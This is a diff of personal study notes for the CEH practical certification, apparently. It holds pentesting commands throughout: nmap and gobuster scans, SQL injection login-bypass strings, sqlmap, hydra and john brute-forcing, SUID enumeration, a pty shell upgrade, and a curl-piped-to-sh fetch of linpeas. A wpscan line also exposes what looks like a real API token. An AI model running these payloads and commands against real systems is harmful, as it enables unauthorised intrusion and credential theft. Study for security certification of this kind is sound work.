@@ -3,14 +3,23 @@ sudo su
 vi get-stuff.sh
 
 mkdir CEH
+
 cd CEH
+
 sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
 sudo curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
+
 sudo chmod +x linpeas.sh
+
 sudo apt install stegseek
+
 sudo apt install gobuster
+
 sudo apt install enum4linux
+
 sudo apt install xsltproc
+
 sudo gem install wpscan
 
 
@@ -18,6 +27,7 @@ sudo gem install wpscan
 
 ## NMAP
 sudo nmap -O -T5 -sV -sC -oA nmap_$ip1_out_all -vv $ip1/24
+
 sudo xsltproc nmap_out_all.xml nmap_$ip1_out_all.html
 
 cd CEH;mkdir $ip;cd $ip;sudo nmap -O -T5 -sV -sC -oA nmap_$ip\_out -vv $ip/24;sudo xsltproc nmap_$ip\_out.xml -o nmap_$ip\_out.html;firefox nmap_$ip\_out.html;
@@ -27,6 +37,7 @@ sudo nmap -O -T5 -sV -sC -p- -oA nmap_$ip\\_out_all -vv $ip/24;sudo xsltproc nma
 
 ### Quick Host Discovery
 sudo nmap -O -T5 -sn $ip/24 
+
 sudo nmap -O -T5 -sn -PR $ip/24                   (-PR ARP requests)
 
 nmap -p 3389 --script rdp-ntlm-info <target>
@@ -39,25 +50,37 @@ sudo gobuster dir  -w /usr/share/wordlists/rockyou.txt -u http://$ip
 
 ## SQLi
 admin' --
+
 admin' #
+
 admin'/*
+
 ' or 1=1--
+
 ' or 1=1#
+
 ' or 1=1/*
+
 ') or '1'='1--
+
 ') or ('1'='1—
 
 sqlmap -u “url" --cookie="cookie" --dbs
 
 ## Burpsuite
 FoxyProxy in firefox
+
 https://jaimelightfoot.com/blog/burp-suite-for-beginners-setup-and-target-proxy-tools/
 
 ## Crypto:
 https://www.tunnelsup.com/hash-analyzer/
+
 https://crackstation.net/
+
 https://medium.com/@FLAME93/introduction-b83f46c44c9a
+
 Hashcat
+
 https://github.com/unstable-deadlock/brashendeavours.gitbook.io/blob/master/pentesting-cheatsheets/hashcat-hash-modes.md
 
 
@@ -79,20 +102,25 @@ wpscan -e ap,u,t --plugins-detection mixed --api-token j6ytwWSsVejE1kASMPSx2TOrL
 wpscan -e u --passwords /path/to/password_file.txt  --url <example.com>
 ## Linpeas Winpeas also exists apparently
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
 ./linpeas.sh -a > /tmp/linpeas.txt
 
 ## BRUTEFORCING
 ### Hydra
 hydra -l <username> -P given_wordlist ftp://$ip
+
 https://github.com/frizb/Hydra-Cheatsheet
 
 ### John:
 Zip file:
+
 Zip2john file > hash.txt
+
 John hash.txt
 
 ## Web App Vuln:
 Nikto
+
 Vega
 
 ## AD Stuff
@@ -104,21 +132,27 @@ https://www.google.com/search?q=determine+FDQN+of+remote+domain+controller&clien
 
 ### Entropy of ELF
 https://github.com/sandflysecurity/sandfly-entropyscan
+
 Entry point for ELF: readelf -a executable_name
 
 
 
 UNIX command exploits: GTFOBins
+
 CEH exercise: https://github.com/3ls3if/Cybersecurity-Notes/blob/main/ethical-hacking-and-pen-testing-notes/ceh-mindmaps/system-hacking/tasks.md
 
 Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2.
 
 Check all suid bit programs (find / -perm -u=s -type f 2>/dev/null)
+
 python -c import pty;pty.spawn("/bin/bash")
 
 General Check: https://book.thegurusec.com/certifications/certified-ethical-hacker-practical
+
 General Check 2: https://github.com/cmuppin/CEH/tree/main/
+
 General Check 3: https://book.hacktricks.xyz/
+
 General Check 4: https://github.com/infovault-Ytube/CEH-Practical-Notes
 
 
@@ -142,26 +176,50 @@ OWASP CheatSheet: https://cheatsheetseries.owasp.org/cheatsheets/
 
 TOOLS:
 Nmap/zenmap
+
 Metasploit
+
 Searchsploit
+
 Hydra
+
 Aircrack-ng
+
 Veracrypt
+
 Theef RAT
+
 BCTextEncoder
+
 StegHide
+
 Adb
+
 John the ripper
+
 Wireshark
+
 Phonesploit
+
 Sqlmap
+
 ZAP
+
 Open Stego
+
 Detect It Easy (DIE)
+
 Openvas
+
 Smbclient
+
 SSH
+
 Crackstation
+
 Hashes.com
+
 Cyberchef
+
 emn178.github.io/online-tools/crc32_checksum.html
+
